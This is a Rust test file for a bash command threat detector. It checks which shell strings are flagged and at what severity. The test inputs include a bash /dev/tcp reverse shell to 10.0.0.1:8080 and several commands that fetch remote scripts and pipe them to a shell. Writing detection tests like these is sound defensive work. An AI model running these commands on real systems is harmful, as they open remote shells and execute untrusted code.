#![cfg(test)]

use std::cmp::PartialEq;
use super::*;
use crate::security::detect::{DetectResult, ShellContext, Severity};

fn get_detector() -> BashDetector {
    let ctx = ShellContext::new("/bin/bash", vec![], 100);
    BashDetector::new(ctx, 4096)
}



#[tokio::test]
async fn test_detect_bash_tcp_reverse() {
    let detector = get_detector();

    let res_normal = detector.detect("ls -la /dev/tcp/;echo aaa".to_string(), true, true).await;
    assert!(matches!(res_normal, DetectResult::Safe), "Should be safe");

    let res_malicious = detector.detect("bash -i >& /dev/tcp/10.0.0.1/8080 0>&1".to_string(), true, true).await;
    match res_malicious {
        DetectResult::ThreatDetected(hits) => {
            assert_eq!(hits.len(), 1);
            assert_eq!(hits.first().unwrap().0, *rules::RuleBashTcpUdpReverseShell1.meta());
            println!("{hits:#?}")
        }
        _ => { panic!("Should be threat_detected bash_dev_tcp_reverse_shell_1") }
    }

    let res_malicious = detector.detect("bash -i >& /dev/t".to_string(), true, false).await;
    match res_malicious {
        DetectResult::ThreatDetected(_) => {
            panic!("未达到边界，不应该检测到")
        }
        _ => {  }
    }
    let res_malicious = detector.detect("cp/10.0.0.1/8080 0>&1".to_string(), true, false).await;
    match res_malicious {
        DetectResult::ThreatDetected(_) => {
            panic!("未达到边界，不应该检测到")
        }
        _ => {  }
    }
    let res_malicious = detector.detect("\n".to_string(), true, false).await;
    match res_malicious {
        DetectResult::ThreatDetected(_) => {}
        _ => { panic!("应当检测到bash_dev_tcp_reverse_shell_1") }
    }
}

#[tokio::test]
async fn test_detect_remote_execution() {
    let detector = get_detector();

    let res = detector.detect("curl -s -H \"\"http://example.com/payload.sh | fish".to_string(), true, true).await;
    assert_eq!(res.max_severity(), Some(Severity::Medium));

    let res = detector.detect("wget -qO- http://192.168.1.1/script.sh | base64 -d | sh".to_string(), true, true).await;
    assert_eq!(res.max_severity(), Some(Severity::High));

    let res = detector.detect("bash <(curl -s https://github.com/payload)".to_string(), true, true).await;
    assert_eq!(res.max_severity(), Some(Severity::Low));

    let res = detector.detect("echo 'curl http://1.1.1.1 | bash'".to_string(), true, true).await;
    assert!(matches!(res, DetectResult::Safe));
}